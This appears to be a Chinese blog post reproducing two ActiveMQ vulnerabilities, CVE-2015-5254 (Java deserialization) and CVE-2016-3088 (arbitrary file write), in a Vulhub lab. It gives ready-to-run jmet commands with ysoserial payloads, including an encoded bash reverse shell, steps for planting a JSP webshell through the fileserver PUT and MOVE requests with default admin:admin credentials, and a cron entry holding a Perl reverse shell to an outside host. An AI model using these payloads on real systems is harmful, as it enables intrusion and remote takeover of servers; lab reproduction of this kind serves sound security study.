# ActiveMQ 反序列化(CVE-2015-5254) && ActiveMQ 任意文件写入 (CVE-2016-3088) - 淚笑 - 博客园

> 原文：[`www.cnblogs.com/leixiao-/p/10218359.html`](https://www.cnblogs.com/leixiao-/p/10218359.html)

# ActiveMQ 反序列化漏洞(CVE-2015-5254)

## 漏洞详情

ActiveMQ 启动后，将监听 61616 和 8161 两个端口，其中消息在 61616 这个端口进行传递，使用 ActiveMQ 这个中间件的程序也通过这个端口工作，8161 是 Web 服务的端口，通过 Web 页面可管理 ActiveMQ
ActiveMQ 反序列化漏洞存在于 ActiveMQ5.13.0 之前 5.x 版本中，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的 Java Message Service(JMS)ObjectMessage 对象利用该漏洞执行任意代码。

## 复现

### 工具

需要使用[jmet](https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar)工具，首先下载 jmet 的 jar 文件，并手动在同目录下创建一个 external 文件夹(否则可能会爆文件夹不存在的错误)

### 漏洞利用

1.  构造可执行命令的 java 序列化对象
    ysoserial 集合了各种 java 反序列化 payload，而 jmet 集成了[ysoserial](https://github.com/frohoff/ysoserial)
2.  把序列化对象作为一个消息，发送给目标的工作端口
3.  访问 Web 管理页面，读取消息，触发漏洞
    ActiveMQ Web 管理页面默认账号密码是 admin:admin

执行
`java -jar jmet-0.1.0-all.jar -Q l3yx -I ActiveMQ -Y "touch /success" -Yp ROME 192.168.122.1 61616`
![](img/7f06f60d4267bead849e0f6e31d567ee.png)

 `usage: jmet [host] [port]
-Q,--Queue <name>queue name
-I,--impl <arg>ActiveMQ| Artemis| WebSphereMQ| Qpid10|
Qpid09| HornetQ| SwiftMQ| RabbitMQ|
OpenMQ
-Y,--ysoserial <cmd>Deser exploitation mode
-Yp,--payload <payloadname>Optional: Ysoserial Payload to use
BeanShell1| CommonsBeanutils1|
CommonsCollections1|
CommonsCollections2|
CommonsCollections3|
CommonsCollections4|
CommonsCollections5| Groovy1|
Hibernate1| Hibernate2| Jdk7u21| JSON1|
ROME| Spring1| Spring2</payloadname></cmd></arg></name>

```
 -Q 指定队列消息名，-I 指定 JMS 客户端，这里是 ActiveMQ，-Y 指定具体的命令，-Yp 指定 payload 类型，其后分别是 ActiveMQ 所在机器的 ip 及工作端口
所以这条命令是使用 ROME payload 把 执行 touch /success 命令序列化后作为名为 l3yx 的消息发送给 ActiveMQ 

然后在 Web 管理页面可查看信息 http://your-ip:8161/
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104133948879-427164103.png)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104133956574-657034883.png)

查看消息的详情后就可触发反序列化漏洞，进入 docker 可以验证命令执行结果
`docker-compose exec activemq bash`
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104134006607-1084499944.png)

然后使用反弹 shell 的命令
`java -jar jmet-0.1.0-all.jar -Q l3yx -I ActiveMQ -Y "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4LzEzMTQgMD4mMQ==}|{base64,-d}|{bash,-i}" -Yp ROME 192.168.122.1 61616`

Vulhub 文档里给的反弹 shell 的 payload 就是
`bash -c  {echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4LzEzMTQgMD4mMQ==}|{base64,-d}|{bash,-i}`

这条命令可以去看[linux 下形如{command,parameter,parameter}执行命令 / bash 花括号扩展](https://www.cnblogs.com/leixiao-/p/10216571.html)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104134017498-208373815.png)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104134023598-1267702351.png)

#ActiveMQ 任意文件写入 (CVE-2016-3088)
##漏洞详情
###背景
8161 为 web 控制台端口，本漏洞就出现在 web 控制台中
ActiveMQ 的 web 控制台分三个应用，admin、api 和 fileserver，其中 admin 是管理员页面，api 是接口，fileserver 是储存文件的接口；admin 和 api 都需要登录后才能使用，fileserver 无需登录。
fileserver 是一个 RESTful API 接口，我们可以通过 GET、PUT、DELETE 等 HTTP 请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高而且文件操作容易出现漏洞
所以，ActiveMQ 在 5.12.x~5.13.x 版本中，已经默认关闭了 fileserver 这个应用（你可以在 conf/jetty.xml 中开启之）；在 5.14.0 版本以后，彻底删除了 fileserver 应用。
###漏洞利用
本漏洞出现在 fileserver 应用中，漏洞原理其实非常简单，就是 fileserver 支持写入文件（但不解析 jsp），同时支持移动文件（MOVE 请求）。所以，我们只需要写入一个文件，然后使用 MOVE 请求将其移动到任意位置，造成任意文件写入漏洞。
文件写入有几种利用方法：
1\. 写入 webshell
2\. 写入 cron 或 ssh key 等文件
3\. 写入 jar 或 jetty.xml 等库和配置文件

写入 webshell 的好处是，门槛低更方便，但前面也说了 fileserver 不解析 jsp，admin 和 api 两个应用都需要登录才能访问，所以有点鸡肋(但默认账号密码都是 admin:admin)。写入 cron 或 ssh key，好处是直接反弹拿 shell，也比较方便，缺点是需要 root 权限；写入 jar，稍微麻烦点（需要 jar 的后门），写入 xml 配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道 activemq 的绝对路径

##写入 webshell
写入 webshell，需要写在 admin 或 api 应用中才能被解析，而这俩应用都需要登录才能访问，默认账号密码为 admin:admin，首先访问 http://your-ip:8161/admin/test/systemProperties.jsp，查看 ActiveMQ 的绝对路径
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143225763-341838470.png)

访问 http://192.168.122.1:8161/fileserver/并用 burp 抓包，方便直接修改，改为 PUT 包，填写文件名，并且内容写入 Cknife 的 jsp 马，返回 204 即为成功
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143239325-1376791767.png)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143245014-1183806380.png)

移动到 web 目录下的 api 文件夹(/opt/activemq/webapps/api/x.jsp)中(admin 目录下 jsp 也可被解析)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143252059-1611475923.png)

尝试访问无报错则已经成功移动
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143301866-480670215.png)

在 Cknife 添加 shell，而且还需要设置一个请求头才能访问，因为访问 api 是需要通过基础认证的，所以在 Cknife 的 shell 右键-设置-请求头-开启，并写入 Authorization: Basic YWRtaW46YWRtaW4= (该请求头在通过基础认证之后，访问 admin 或是 api 目录再用 burp 就可抓到)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143310125-1083549546.png)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143316965-893753944.png)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104143322288-1722943140.png)

##写入 crontab
cron 是一个 linux 下 的定时执行工具，可以在无需人工干预的情况下运行作业，cron 读取一个或多个配置文件，这些配置文件中包含了命令行及其调用时间。cron 的配置文件称为 crontab，是 cron table 的简写
Vulhub 文档里的配置
`*/1 * * * * root /usr/bin/perl -e 'use Socket;$i="10.0.0.1";$p=21;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

crontab 中前 5 项应填数字，分别代表分钟，小时，天，月，星期，`*`代表任意值；`,`允许一项内填多个值，其间就用逗号分隔；`/`可以理解为整除，`*/1` 和 `*` 没有区别，`*/2` 可以看成是能被 2 整除的任意值；`*/1 * * * *`就代表每分钟都会执行；`root`代表的是执行的级别为 root 身份。`/usr/bin/perl -e 'use Socket;$i="10.0.0.1";$p=21;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`是使用 perl 执行代码，-e 后面的代码应该就是 perl 反弹 shell 的方法

首先上传 cron 配置文件(注意，换行一定要\n，不能是\r\n，否则 crontab 执行会失败)
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104155751641-1485372109.png)

然后移动到/etc/cron.d/l3yx，/etc/cron.d/目录下的文件都会被作为 crontab 而被读取执行
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104155800542-189628033.png)

然而并没有成功，一番调试后，把绝对路径执行 perl`/usr/bin/perl -e`改为`perl -e`再次写入/etc/cron.d/l3yx，shell 反弹成功
![](https://img2018.cnblogs.com/blog/1495876/201901/1495876-20190104155807913-1209938408.png)

这个方法需要 ActiveMQ 是 root 运行，否则也不能写入 cron 文件

参考：
[`vulhub.org/#/environments/activemq/CVE-2015-5254/`](https://vulhub.org/#/environments/activemq/CVE-2015-5254/)
[`www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf`](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)
[`github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md`](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md)
[Linux 下的 crontab 定时执行任务命令详解](https://www.cnblogs.com/longjshz/p/5779215.html)
[Ubuntu 下 crontab 命令的用法](https://www.cnblogs.com/daxian2012/articles/2589894.html)
````